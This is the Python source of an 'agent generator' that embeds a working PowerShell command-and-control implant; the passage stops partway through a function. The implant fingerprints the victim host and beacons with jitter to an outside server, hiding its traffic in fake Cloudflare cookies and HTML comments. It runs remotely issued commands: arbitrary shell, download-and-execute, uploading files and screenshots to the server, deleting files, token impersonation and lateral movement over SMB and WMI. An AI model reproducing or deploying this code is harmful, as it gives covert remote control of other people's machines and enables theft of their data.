"""
Agent Generator with Advanced Obfuscation and WebClient SSL Support
Module for generating PowerShell agents with WebClient for SSL compatibility
Agent inherits SSL configuration from dropper
"""

import socket
import string
import random

class AgentGenerator:
    def __init__(self, config_loader, logger):
        self.config_loader = config_loader
        self.logger = logger
        self.agent_template = self._get_embedded_template()
        self.amount_of_arrays = 3
        self.array_name_length = 3
        self.number_of_operations = 3
        self.created_arrays = {}
        self.list_of_chars = [char for char in string.printable]
    
    def _get_embedded_template(self):
        template = r'''$global:debugMode = {{DEBUG_MODE}}
function Write-AgentDebug {
    param([string]$message)
    if ($global:debugMode) {
        $timestamp = Get-Date -Format "HH:mm:ss"
        Write-Host "[$timestamp][AGENT] $message" -ForegroundColor Green
    }
}

Write-AgentDebug "Agent starting..."

$global:agentUri = "{{AGENT_URI}}"
$global:agentProt = "{{AGENT_PROTOCOL}}"
$global:agentHost = "{{AGENT_HOST}}"
if (-not $global:agentUrl) { $global:agentUrl = "{{AGENT_URL}}" }
$global:aesKey = "{{AES_KEY}}"
$global:sleepTime = {{SLEEP_TIME}}
$global:jitter = {{JITTER}}
{{AGENT_HEADERS}}

Write-AgentDebug "Configuration loaded - URI: $global:agentUri"
Write-AgentDebug "Protocol: $global:agentProt | Host: $global:agentHost"
Write-AgentDebug "AES Key Length: $($global:aesKey.Length) characters"
Write-AgentDebug "Sleep Time: $global:sleepTime seconds | Jitter: $global:jitter%"

$combinedString = "$env:COMPUTERNAME-$env:USERNAME"
$hashedBytes = [System.Security.Cryptography.SHA256]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($combinedString))
$global:uniqueId = [System.BitConverter]::ToString($hashedBytes) -replace '-'

Write-AgentDebug "Generated UUID: $($global:uniqueId.Substring(0, 16))"

$enc = [System.Text.Encoding]::UTF8

function aes {
    param($string, $method)
    
    try {
        $keyBytes = $enc.GetBytes($global:aesKey)
        if ($keyBytes.Length -lt 32) {
            $keyBytes = $keyBytes + (New-Object byte[] (32 - $keyBytes.Length))
        }
        elseif ($keyBytes.Length -gt 32) {
            $keyBytes = $keyBytes[0..31]
        }
        
        Write-AgentDebug "AES - Using key of length: $($keyBytes.Length) bytes"
        
        if ($method -eq "encrypt") {
            Write-AgentDebug "AES Encrypt - Beginning encryption process"
            
            $step1_base64 = [System.Convert]::ToBase64String($enc.GetBytes($string))
            Write-AgentDebug "AES Encrypt - Step 1: Input data base64 encoded"
            $iv = New-Object byte[] 16
            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
            $rng.GetBytes($iv)
            Write-AgentDebug "AES Encrypt - Step 2: Generated random IV"
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $keyBytes
            $aes.IV = $iv
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $encryptor = $aes.CreateEncryptor()
            $encryptedBytes = $encryptor.TransformFinalBlock($enc.GetBytes($step1_base64), 0, $enc.GetBytes($step1_base64).Length)
            Write-AgentDebug "AES Encrypt - Steps 3-4: Data encrypted with AES-256-CBC"
            $combinedBytes = $iv + $encryptedBytes
            $result = [System.Convert]::ToBase64String($combinedBytes)
            Write-AgentDebug "AES Encrypt - Step 5: Returning base64(IV + ciphertext)"
            
            return $result
            
        } else {
            Write-AgentDebug "AES Decrypt - Beginning decryption process"
            
            $encryptedData = [System.Convert]::FromBase64String($string)
            Write-AgentDebug "AES Decrypt - Step 1: Input data base64 decoded"
            $iv = $encryptedData[0..15]
            $ciphertext = $encryptedData[16..($encryptedData.Length-1)]
            Write-AgentDebug "AES Decrypt - Step 2: IV extracted from encrypted data"
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = $keyBytes
            $aes.IV = $iv
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $decryptor = $aes.CreateDecryptor()
            $decryptedBytes = $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            Write-AgentDebug "AES Decrypt - Steps 3-4: Data decrypted with AES-256-CBC"
            $base64Original = $enc.GetString($decryptedBytes)
            $result = $enc.GetString([System.Convert]::FromBase64String($base64Original))
            Write-AgentDebug "AES Decrypt - Step 5: Returning original data"
            
            return $result
        }
    }
    catch {
        Write-AgentDebug "AES Error: $_"
        return $null
    }
}

function ExtractBase64FromHtml {
    param([string]$htmlContent)
    
    try {
        Write-AgentDebug "Extracting base64 from HTML content"
        
        if ([string]::IsNullOrEmpty($htmlContent)) {
            Write-AgentDebug "HTML content is empty"
            return $null
        }
        
        $pattern = "<!--1RVGE1\s*(.*?)\s*1RVGE1-->"
        $match = [regex]::Match($htmlContent, $pattern)
        
        if ($match.Success -and $match.Groups.Count -gt 1) {
            $base64Content = $match.Groups[1].Value.Trim()
            Write-AgentDebug "Successfully extracted base64 content"
            return $base64Content
        } else {
            Write-AgentDebug "No base64 content found in HTML"
            return $null
        }
    } catch {
        Write-AgentDebug "Error extracting base64 from HTML: $($_.Exception.Message)"
        return $null
    }
}

function DecryptJSONResponse {
   param([string]$encryptedResponse)
   
   try {
       Write-AgentDebug "DecryptJSONResponse - Processing encrypted response"
       
       $base64Content = ExtractBase64FromHtml $encryptedResponse
       
       if ($base64Content) {
           Write-AgentDebug "Using extracted base64 content for decryption"
           $encryptedResponse = $base64Content
       } else {
           Write-AgentDebug "No base64 content found, using raw response"
       }
       
       $jsonString = aes $encryptedResponse "decrypt"
       
       $jsonObject = $jsonString | ConvertFrom-Json
       
       return $jsonObject
       
   } catch {
       Write-AgentDebug "Error decrypting JSON response: $($_.Exception.Message)"
       return $null
   }
}

function CreateWebClientWithCookies {
    param([Microsoft.PowerShell.Commands.WebRequestSession]$session = $null)
    
    try {
        $webClient = New-Object System.Net.WebClient
        foreach ($headerKey in $global:headers.Keys) {
            $webClient.Headers.Add($headerKey, $global:headers[$headerKey])
            Write-AgentDebug "Added header: $headerKey = $($global:headers[$headerKey])"
        }
        
        if ($session -and $session.Cookies -and $session.Cookies.Count -gt 0) {
            $cookieString = ""
            
            $fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)"
            $uri = [System.Uri]$fullUri
            $cookieContainer = $session.Cookies.GetCookies($uri)
            
            Write-AgentDebug "Found $($cookieContainer.Count) cookies for URI: $fullUri"
            
            foreach ($cookie in $cookieContainer) {
                if ($cookieString -ne "") { $cookieString += "; " }
                $cookieString += "$($cookie.Name)=$($cookie.Value)"
                Write-AgentDebug "Adding cookie: $($cookie.Name)=$($cookie.Value.Substring(0, [Math]::Min(20, $cookie.Value.Length)))..."
            }
            
            if ($cookieString -ne "") {
                $webClient.Headers.Add("Cookie", $cookieString)
                Write-AgentDebug "Added cookies to WebClient: $cookieString"
            } else {
                Write-AgentDebug "No cookies to add after processing"
            }
        } else {
            if (-not $session) {
                Write-AgentDebug "No session provided"
            } elseif (-not $session.Cookies) {
                Write-AgentDebug "No cookies in session"
            } else {
                Write-AgentDebug "Session has 0 cookies"
            }
        }
        
        Write-AgentDebug "WebClient created with $($webClient.Headers.Count) headers"
        return $webClient
    } catch {
        Write-AgentDebug "Error creating WebClient: $($_.Exception.Message)"
        return $null
    }
}

function SendInitialFingerprint {
    Write-AgentDebug "Sending initial fingerprint..."
    
    try {
        $uuid = $global:uniqueId.Substring(0, 16)
        $hostname = $env:COMPUTERNAME
        $username = $env:USERNAME
        $domain = $env:USERDOMAIN
        $admin = if (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "y" } else { "n" }
        $pidLocal = $PID
        $infected = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

        Write-AgentDebug "Fingerprint data: $hostname\\$username ($domain) - Admin: $admin - PID: $pidLocal"

        $data = @{
            uuid = $uuid
            hostname  = $hostname
            username  = $username
            domain    = $domain
            admin     = $admin
            pid       = $pidLocal 
            infected  = $infected
        }

        $jsonData = ConvertTo-Json $data -Compress
        $encrypted = aes $jsonData "encrypt"

        Write-AgentDebug "Fingerprint encrypted (length: $($encrypted.Length))"

        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
        $fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)"
        $uri = [System.Uri]$fullUri
        
        $cfinCookie = New-Object System.Net.Cookie("cfin", $encrypted)
        $cfinCookie.Domain = $uri.Host
        $cfinCookie.Path = "/"
        $session.Cookies.Add($cfinCookie)
        
        Write-AgentDebug "Created cfin cookie: cfin=$($encrypted.Substring(0,20))... for domain: $($uri.Host)"

        $webClient = CreateWebClientWithCookies -session $session
        if ($webClient) {
            try {
                Write-AgentDebug "Sending fingerprint to: $fullUri"
                $response = $webClient.DownloadString($fullUri)
                Write-AgentDebug "Fingerprint sent successfully - Response length: $($response.Length)"
            } catch {
                Write-AgentDebug "Error sending fingerprint: $($_.Exception.Message)"
            } finally {
                $webClient.Dispose()
            }
        } else {
            Write-AgentDebug "Failed to create WebClient for fingerprint"
        }
    } catch {
        Write-AgentDebug "Error in SendInitialFingerprint: $($_.Exception.Message)"
    }
}

function CreateCookie {
    $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
    
    $jsonData = "{""uuid"":""$($global:uniqueId.Substring(0, 16))""}"
    $encrypted = aes $jsonData "encrypt"
    
    $session.Cookies.Add((New-Object System.Net.Cookie("cf_clearance", $encrypted, "/", $($global:agentUrl))))
    return $session
}

$global:lastCommand = ""
$global:lastTid = 0
$global:knownCommands = @("execute", "pkill", "plist", "pname", "upload", "download", "list", "shell", "screenshot", "delete", "fcopy", "mkdir", "exit", "who", "asleep", "make_token", "rev2self", "smb_exec", "wmi_exec")

function Get-JitteredSleepTime {
    if ($global:jitter -le 0) {
        return $global:sleepTime
    }
    
    $maxJitterValue = [Math]::Floor($global:sleepTime * ($global:jitter / 100.0))
    
    if ($maxJitterValue -lt 1) {
        $maxJitterValue = 1
    }
    
    $minJitterValue = [Math]::Max(1, [Math]::Floor($maxJitterValue * 0.25))
    $actualJitter = Get-Random -Minimum $minJitterValue -Maximum ($maxJitterValue + 1)
    
    $sign = Get-Random -Minimum 0 -Maximum 2
    
    if ($sign -eq 0) {
        $jitteredTime = [Math]::Max(1, $global:sleepTime - $actualJitter)
    } else {
        $jitteredTime = $global:sleepTime + $actualJitter
    }
    
    $primes = @(1, 2, 3, 5, 7)
    $randomPrime = $primes[$(Get-Random -Minimum 0 -Maximum $primes.Length)]
    $jitteredTime = $jitteredTime + $randomPrime
    
    Write-AgentDebug "Applied jitter: base $global:sleepTime seconds  jittered $jitteredTime seconds"
    return [int]$jitteredTime
}

function SendOutput {
    param([string]$output)

    Write-AgentDebug "Sending output (length: $($output.Length))"

    try {
        $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
        $fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)"
        $uri = [System.Uri]$fullUri
        $uploadUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)/upload"

        $jsonData = "{""uuid"":""$($global:uniqueId.Substring(0, 16))"",""tid"":$($global:lastTid)}"
        $encrypted = aes $jsonData "encrypt"
        $clearanceCookie = New-Object System.Net.Cookie("cf_clearance", $encrypted)
        $clearanceCookie.Domain = $uri.Host
        $clearanceCookie.Path = "/"
        $session.Cookies.Add($clearanceCookie)
        
        if ($output.Length -lt 3500) {
            $useCookieMethod = $true
            Write-AgentDebug "Output is small enough for cookie method (GET)"
            
            $encryptedOutput = aes $output "encrypt"
            Write-AgentDebug "Output encrypted, length: $($encryptedOutput.Length) chars"
            
            if ($encryptedOutput.Length -gt 3500) {
                Write-AgentDebug "Encrypted output too large for cookie, switching to POST method"
                $useCookieMethod = $false
            }
            
            if ($useCookieMethod) {
                try {
                    Write-AgentDebug "Created cf_clearance cookie: cf_clearance=$($encrypted.Substring(0,20))..."
                    Write-AgentDebug "Creating cflb cookie: cflb=$($encryptedOutput.Substring(0,20))..."
                    
                    $outputCookie = New-Object System.Net.Cookie("cflb", $encryptedOutput)
                    $outputCookie.Domain = $uri.Host
                    $outputCookie.Path = "/"
                    $session.Cookies.Add($outputCookie)
                    $webClient = CreateWebClientWithCookies -session $session
                    
                    if ($webClient) {
                        $response = $webClient.DownloadString($fullUri)
                        Write-AgentDebug "Output sent successfully via GET"
                        $webClient.Dispose()
                        return
                    }
                } catch {
                    Write-AgentDebug "Error using cookie method: $($_.Exception.Message)"
                    Write-AgentDebug "Falling back to POST method"
                }
            }
        }
        
        Write-AgentDebug "Using POST method to send output"
        
        $outputData = @{
            uuid = $global:uniqueId.Substring(0, 16)
            data = $output
            type = "command_output"
            tid = $global:lastTid
        }
        
        $jsonData = ConvertTo-Json $outputData -Compress
        $encryptedData = aes $jsonData "encrypt"
        
        Write-AgentDebug "Output JSON created and encrypted for POST"
        
        $webClient = CreateWebClientWithCookies
        if ($webClient) {
            try {
                $responseBytes = $webClient.UploadData($uploadUri, [System.Text.Encoding]::UTF8.GetBytes($encryptedData))
                $response = [System.Text.Encoding]::UTF8.GetString($responseBytes)
                Write-AgentDebug "Output sent successfully via POST"
            } catch {
                Write-AgentDebug "Error sending output via POST: $($_.Exception.Message)"
            } finally {
                $webClient.Dispose()
            }
        }
    } catch {
        Write-AgentDebug "Error in SendOutput: $($_.Exception.Message)"
    }
}

function execCommandLoop {
    Write-AgentDebug "Starting command loop..."
    $loopCount = 0
    
    while ($true) {
        $loopCount++
        Write-AgentDebug "Command loop iteration: $loopCount"
        
        try {
            $session = New-Object Microsoft.PowerShell.Commands.WebRequestSession
            $fullUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)"
            $uri = [System.Uri]$fullUri
            $jsonData = "{""uuid"":""$($global:uniqueId.Substring(0, 16))""}"
            $encrypted = aes $jsonData "encrypt"
            $clearanceCookie = New-Object System.Net.Cookie("cf_clearance", $encrypted)
            $clearanceCookie.Domain = $uri.Host
            $clearanceCookie.Path = "/"
            $session.Cookies.Add($clearanceCookie)

            $syncData = @{
                uuid      = $global:uniqueId.Substring(0, 16)
                timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            }
            
            $syncJson = ConvertTo-Json $syncData -Compress
            $syncEncrypted = aes $syncJson "encrypt"
            
            $syncCookie = New-Object System.Net.Cookie("cfsync", $syncEncrypted)
            $syncCookie.Domain = $uri.Host
            $syncCookie.Path = "/"
            $session.Cookies.Add($syncCookie)
            
            Write-AgentDebug "Created cookies - cf_clearance: $($encrypted.Substring(0,20))... | cfsync: $($syncEncrypted.Substring(0,20))... for domain: $($uri.Host)"
            $webClient = CreateWebClientWithCookies -session $session
            $responseContent = ""
            
            if ($webClient) {
                try {
                    Write-AgentDebug "Requesting commands from: $fullUri"
                    $responseContent = $webClient.DownloadString($fullUri)
                    Write-AgentDebug "Response received (length: $($responseContent.Length))"
                } catch {
                    Write-AgentDebug "Network error: $($_.Exception.Message)"
                    $jitteredSleep = Get-JitteredSleepTime
                    Write-AgentDebug "Sleeping for $jitteredSleep seconds..."
                    Start-Sleep -Seconds $jitteredSleep
                    continue
                } finally {
                    $webClient.Dispose()
                }
            } else {
                Write-AgentDebug "Failed to create WebClient"
                $jitteredSleep = Get-JitteredSleepTime
                Write-AgentDebug "Sleeping for $jitteredSleep seconds..."
                Start-Sleep -Seconds $jitteredSleep
                continue
            }

            if (-not $responseContent -or $responseContent.Trim() -eq "") {
                Write-AgentDebug "Empty response - sleeping..."
                $jitteredSleep = Get-JitteredSleepTime
                Write-AgentDebug "Sleeping for $jitteredSleep seconds..."
                Start-Sleep -Seconds $jitteredSleep
                continue
            }

            Write-AgentDebug "Raw response content: $($responseContent.Substring(0, [Math]::Min(50, $responseContent.Length)))..."

            $jsonObject = DecryptJSONResponse $responseContent

            if (-not $jsonObject) {
                Write-AgentDebug "Failed to decrypt JSON response"
                $jitteredSleep = Get-JitteredSleepTime
                Write-AgentDebug "Sleeping for $jitteredSleep seconds..."
                Start-Sleep -Seconds $jitteredSleep
                continue
            }

            $uuid = $jsonObject.uuid
            $cmd = $jsonObject.cmd
            $tid = if ($jsonObject.PSObject.Properties['tid']) { $jsonObject.tid } else { 0 }

            Write-AgentDebug "Decrypted command - UUID: '$uuid' | CMD: '$cmd' | TID: '$tid'"

            if ($uuid -ne $global:uniqueId.Substring(0,16)) {
                Write-AgentDebug "UUID mismatch - Expected: '$($global:uniqueId.Substring(0,16))' | Received: '$uuid'"
                $jitteredSleep = Get-JitteredSleepTime
                Write-AgentDebug "Sleeping for $jitteredSleep seconds..."
                Start-Sleep -Seconds $jitteredSleep
                continue
            }

            $newCommand = $cmd.Trim()

            if ($newCommand -and $tid -ne $global:lastTid) {
                Write-AgentDebug "New task received (TID: $tid): '$newCommand'"
                $global:lastTid = $tid
                $global:lastCommand = $newCommand

                $cmdParts = $newCommand -split " ", 2
                $cmdName = $cmdParts[0]
                $cmdArg = if ($cmdParts.Count -gt 1) { $cmdParts[1] } else { "" }

                Write-AgentDebug "Executing command: $cmdName with args: '$cmdArg'"

                if ($global:knownCommands -contains $cmdName) {
                    $exec = switch ($cmdName) {
                        "execute" { execute -filePath $cmdArg }
                        "pkill"   { pkill -pidKill $cmdArg }
                        "plist"   { plist }
                        "pname"   { pname -name $cmdArg }
                        "upload"   { upload -filePath $cmdArg }
                        "download" {
                                        $dl_parts = $cmdArg -split " ", 2
                                        $url = $dl_parts[0]
                                        $outputDir = if ($dl_parts.Count -gt 1) { $dl_parts[1] } else { "" }
                                        download -url $url -outputDir $outputDir
                                    }
                        "list"      { list -path $cmdArg }
                        "shell"   { shell -cmd $cmdArg }
                        "screenshot" { screenshot }
                        "delete"  { delete -path $cmdArg }
                        "fcopy"      { fcopy -paths $cmdArg }
                        "mkdir"   { mkdir -path $cmdArg }
                        "exit"    { exit_agent }
                        "who"  { who }
                        "asleep"   { asleep -seconds $cmdArg }
                        "make_token" { make_token -credentials $cmdArg }
                        "rev2self" { rev2self }
                        "smb_exec" { 
                            $smb_parts = $cmdArg -split " ", 3
                            $target = $smb_parts[0]
                            $command = $smb_parts[1]
                            $credentials = if ($smb_parts.Count -gt 2) { $smb_parts[2] } else { "" }
                            smb_exec -target $target -command $command -credentials $credentials
                        }
                        "wmi_exec" { 
                            $wmi_parts = $cmdArg -split " ", 3
                            $target = $wmi_parts[0]
                            $command = $wmi_parts[1]
                            $credentials = if ($wmi_parts.Count -gt 2) { $wmi_parts[2] } else { "" }
                            wmi_exec -target $target -command $command -credentials $credentials
                        }
                        default   { "[!] Command recognized but not implemented." }
                    }
                } else {
                    $exec = "[!] Command '$cmdName' not recognized."
                }

                if ($exec -is [string]) {
                    $preview = if ($exec.Length -gt 100) { $exec.Substring(0,100) } else { $exec }
                    Write-AgentDebug "Command result (length: $($exec.Length)): $preview..."
                } elseif ($null -eq $exec) {
                    Write-AgentDebug "Command result: <null>"
                } else {
                    Write-AgentDebug "Command result type [$($exec.GetType().Name)]: $exec"
                }

                SendOutput $exec
            } else {
                if (-not $newCommand) {
                    Write-AgentDebug "No command in response"
                } else {
                    Write-AgentDebug "Duplicate task ignored (TID: $tid): '$newCommand'"
                }
            }
        } catch {
            Write-AgentDebug "Error in command loop: $($_.Exception.Message)"
        }

        Write-AgentDebug "Sleeping for $global:sleepTime seconds..."
        $jitteredSleep = Get-JitteredSleepTime
        Write-AgentDebug "Sleeping for $jitteredSleep seconds (with jitter)..."
        Start-Sleep -Seconds $jitteredSleep
    }
}

function execute {
    param([string]$filePath)
    try {
        Start-Process -filePath $filePath
        return "[+] Executed: $filePath"
    } catch {
        return "[-] Error executing: $_"
    }
}

function pkill {
    param([int]$pidKill)
    try {
        Stop-Process -Id $pidKill -Force
        return "[+] Process $pidKill terminated."
    } catch {
        return "[!] Error terminating process {$pidKill}: $_"
    }
}

function plist {
    try {
        $procs = Get-Process | Sort-Object Id
        return ($procs | Select-Object Id, ProcessName | Format-Table -AutoSize | Out-String)
    } catch {
        return "[!] Error listing processes: $_"
    }
}

function upload {
    param([string]$filePath)
    
    try {
        if (-not (Test-Path $filePath)) {
            return "[!] File not found: $filePath"
        }
        
        $fileInfo = Get-Item $filePath
        $fileName = $fileInfo.Name
        $fileSize = $fileInfo.Length
        
        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
        $fileContentB64 = [System.Convert]::ToBase64String($fileBytes)
        
        $uploadData = @{
            uuid = $global:uniqueId.Substring(0, 16)
            filename = $fileName
            content = $fileContentB64
        }
        
        $jsonData = ConvertTo-Json $uploadData -Compress
        $encryptedData = aes $jsonData "encrypt"
        $uploadUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)" 
        Write-AgentDebug "Uploading file: $fileName ($fileSize bytes) to $uploadUri"
        $webClient = New-Object System.Net.WebClient
        
        foreach ($headerKey in $global:headers.Keys) {
            $webClient.Headers.Add($headerKey, $global:headers[$headerKey])
            Write-AgentDebug "Added upload header: $headerKey = $($global:headers[$headerKey])"
        }
        
        $webClient.Headers.Add("Content-Type", "application/octet-stream")
        
        try {
            $responseBytes = $webClient.UploadData($uploadUri, [System.Text.Encoding]::UTF8.GetBytes($encryptedData))
            $responseContent = $enc.GetString($responseBytes)
            
            Write-AgentDebug "Upload response received (length: $($responseContent.Length))"
            
            $uploadResult = DecryptJSONResponse $responseContent
            
            if ($uploadResult -and $uploadResult.status -eq "success") {
                return "[+] File uploaded successfully: $fileName -> $($uploadResult.filename) ($($uploadResult.size) bytes)"
            }
            elseif ($uploadResult -and $uploadResult.status -eq "error") {
                return "[!] Upload error: $($uploadResult.error)"
            }
            else {
                return "[!] Upload error: Invalid server response"
            }
        } catch [System.Net.WebException] {
            Write-AgentDebug "Upload WebException: $($_.Exception.Message)"
            return "[!] Network error on upload: $($_.Exception.Message)"
        } catch {
            Write-AgentDebug "Upload error: $($_.Exception.Message)"
            return "[!] Upload error: $($_.Exception.Message)"
        } finally {
            $webClient.Dispose()
        }
        
    } catch [System.IO.IOException] {
        return "[!] File read error: $($_.Exception.Message)"
    } catch {
        return "[!] Upload error: $($_.Exception.Message)"
    }
}

function download {
    param(
        [string]$url,
        [string]$outputDir
    )
    
    try {
        if (-not $outputDir -or -not (Test-Path $outputDir -PathType Container)) {
            return "[!] Error: Output directory is required and must exist. Usage: download http://server.com/file.exe C:\path\to\save"
        }
        
        $fileName = [System.IO.Path]::GetFileName($url)
        if (-not $fileName -or $fileName -eq "") {
            $fileName = "downloaded_file_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
        }
        $file = Join-Path -Path $outputDir -ChildPath $fileName
        
        $webClient = New-Object System.Net.WebClient
        
        $webClient.Headers.Add("User-Agent", $global:headers["User-Agent"])
        $webClient.Headers.Add("Accept", "*/*")
        $webClient.Headers.Add("Accept-Encoding", "gzip, deflate")
        
        $fileBytes = $webClient.DownloadData($url)
        
        [System.IO.File]::WriteAllBytes($file, $fileBytes)
        
        if (Test-Path $file) {
            $savedFileInfo = Get-Item $file
            $savedSize = $savedFileInfo.Length
            return "[+] File downloaded: $file ($savedSize bytes)"
        } else {
            return "[!] Error: File was not created correctly"
        }
        
    } catch [System.Net.WebException] {
        return "[!] Network error downloading: $($_.Exception.Message)"
    } catch [System.UnauthorizedAccessException] {
        return "[!] Permission error: Cannot write to $file"
    } catch [System.IO.IOException] {
        return "[!] I/O error: $($_.Exception.Message)"
    } catch [System.UriFormatException] {
        return "[!] Invalid URL: $url"
    } catch {
        return "[!] Download error: $($_.Exception.Message)"
    } finally {
        if ($webClient) {
            $webClient.Dispose()
        }
    }
}

function list {
    param([string]$path)
    try {
        if (-not (Test-Path $path)) { return "[!] Invalid path: $path" }

        $items = Get-ChildItem -Path $path -Force -ErrorAction Stop
        
        if ($items.Count -eq 0) {
            return "[i] Directory is empty: $path"
        }
        
        $result = "Mode          LastWriteTime         Length Name`n----          -------------         ------ ----`n"
        foreach ($item in $items) {
            $mode = $item.Mode
            $lastWrite = $item.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
            $length = if ($item.PSIsContainer) { "<DIR>" } else { $item.Length }
            $name = $item.Name
            $result += "{0,-13} {1,-20} {2,-10} {3}`n" -f $mode, $lastWrite, $length, $name
        }
        
        return $result
    } catch {
        return "[!] Error listing ${path}: $_"
    }
}

function shell {
    param([string]$cmd)

    try {
        Write-AgentDebug "Executing command in isolated runspace: $cmd"
        $sessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $runspace = [runspacefactory]::CreateRunspace($sessionState)
        $runspace.Open()
        
        $powershell = [powershell]::Create()
        $powershell.Runspace = $runspace
        
        [void]$powershell.AddScript($cmd)
        
        $outputCollection = New-Object System.Collections.ArrayList
        
        [void]$powershell.Streams.Error.add_DataAdded({
            $errorData = $powershell.Streams.Error[$_.Index]
            $global:errorMessage = $errorData.Exception.Message
        })
        
        [void]$powershell.Streams.Information.add_DataAdded({
            $infoData = $powershell.Streams.Information[$_.Index]
            [void]$outputCollection.Add($infoData.MessageData)
        })
        
        $result = $powershell.Invoke()
        
        foreach ($item in $result) {
            [void]$outputCollection.Add($item)
        }
        
        $outputString = ($outputCollection | Out-String).Trim()
        
        if ($global:errorMessage) {
            $outputString = "[!] Error: $global:errorMessage`n$outputString"
            $global:errorMessage = $null
        }
        
        if ([string]::IsNullOrWhiteSpace($outputString)) {
            $outputString = "[!] Command executed, but no output was returned"
        }
        
        return $outputString
    }
    catch {
        return "[!] Error executing command in runspace: $_"
    }
    finally {
        if ($powershell) {
            $powershell.Dispose()
        }
        if ($runspace) {
            $runspace.Close()
            $runspace.Dispose()
        }
    }
}

function screenshot {
    try {
        Write-AgentDebug "Taking screenshot..."
        
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.IO
        
        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
        
        $memoryStream = New-Object System.IO.MemoryStream
        $bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose()
        $bitmap.Dispose()
        
        $fileBytes = $memoryStream.ToArray()
        $memoryStream.Close()
        $memoryStream.Dispose()
        
        $fileName = "screenshot_" + [Guid]::NewGuid().ToString() + ".png"
        $fileSize = $fileBytes.Length
        
        $fileContentB64 = [System.Convert]::ToBase64String($fileBytes)
        
        $uploadData = @{
            uuid = $global:uniqueId.Substring(0, 16)
            filename = $fileName
            content = $fileContentB64
            metadata = "[SCREENSHOT]"
        }
        
        $jsonData = ConvertTo-Json $uploadData -Compress
        $encryptedData = aes $jsonData "encrypt"
        $uploadUri = "$($global:agentProt)://$($global:agentUrl)$($global:agentUri)" 
        Write-AgentDebug "Uploading screenshot: $fileName ($fileSize bytes) to $uploadUri"
        $webClient = New-Object System.Net.WebClient
        
        foreach ($headerKey in $global:headers.Keys) {
            $webClient.Headers.Add($headerKey, $global:headers[$headerKey])
            Write-AgentDebug "Added upload header: $headerKey = $($global:headers[$headerKey])"
        }
        
        $webClient.Headers.Add("Content-Type", "application/octet-stream")
        
        try {
            $responseBytes = $webClient.UploadData($uploadUri, [System.Text.Encoding]::UTF8.GetBytes($encryptedData))
            $responseContent = $enc.GetString($responseBytes)
            
            Write-AgentDebug "Upload response received (length: $($responseContent.Length))"
            
            $uploadResult = DecryptJSONResponse $responseContent
            
            if ($uploadResult -and $uploadResult.status -eq "success") {
                return "[+] Screenshot taken and uploaded successfully [SCREENSHOT]"
            } else {
                return "[!] Screenshot upload failed: $($uploadResult.error)"
            }
        } catch {
            return "[!] Screenshot upload error: $($_.Exception.Message)"
        } finally {
            $webClient.Dispose()
        }
    } catch {
        Write-AgentDebug "Error taking screenshot: $($_.Exception.Message)"
        return "[!] Error taking screenshot: $($_.Exception.Message)"
    }
}

function pname {
    param([string]$name)

    try {
        $procs = Get-Process | Where-Object { $_.Name -like "*$name*" }
        if ($procs.Count -eq 0) { return "[!] No process found with name: $name" }

        $output = ""
        foreach ($proc in $procs) {
            $output += "Name: $($proc.Name)`nPID: $($proc.Id)`n---`n"
        }
        return $output.TrimEnd("`n---`n")
    } catch {
        return "[!] Error searching processes: $_"
    }
}

function delete {
    param([string]$path)
    
    try {
        if (-not (Test-Path $path)) {
            return "[!] Path not found: $path"
        }
        
        $item = Get-Item -Path $path
        $isDirectory = $item.PSIsContainer
        
        if ($isDirectory) {
            Remove-Item -Path $path -Recurse -Force
            return "[+] Directory deleted successfully: $path"
        } else {
            Remove-Item -Path $path -Force
            return "[+] File deleted successfully: $path"
        }
    } catch {
        return "[!] Error deleting path: $_"
    }
}

function fcopy {
    param([string]$paths)
    
    try {
        $pathArray = $paths -split '\s+', 2
        $source = $pathArray[0]
        $destination = $pathArray[1]
        
        if (-not (Test-Path $source)) {
            return "[!] Source file not found: $source"
        }
        
        Copy-Item -Path $source -Destination $destination -Force
        return "[+] File copied: $source -> $destination"
    } catch {
        return "[!] Error copying file: $_"
    }
}

function mkdir {
    param([string]$path)
    
    try {
        if (Test-Path $path) {
            return "[!] Directory already exists: $path"
        }
        
        New-Item -Path $path -ItemType Directory -Force | Out-Null
        return "[+] Directory created: $path"
    } catch {
        return "[!] Error creating directory: $_"
    }
}

function exit_agent {
    try {
        Write-AgentDebug "Exiting agent by command..."
        SendOutput "[+] Agent terminating by command"
        Start-Sleep -Seconds 1
        [Environment]::Exit(0)
        return "[+] Agent terminated"
    } catch {
        return "[!] Error terminating agent: $_"
    }
}

function asleep {
    param (
        [Parameter(Mandatory=$true)]
        [string]$seconds
    )
    try {
        [int]$sleepValue = [int]$seconds
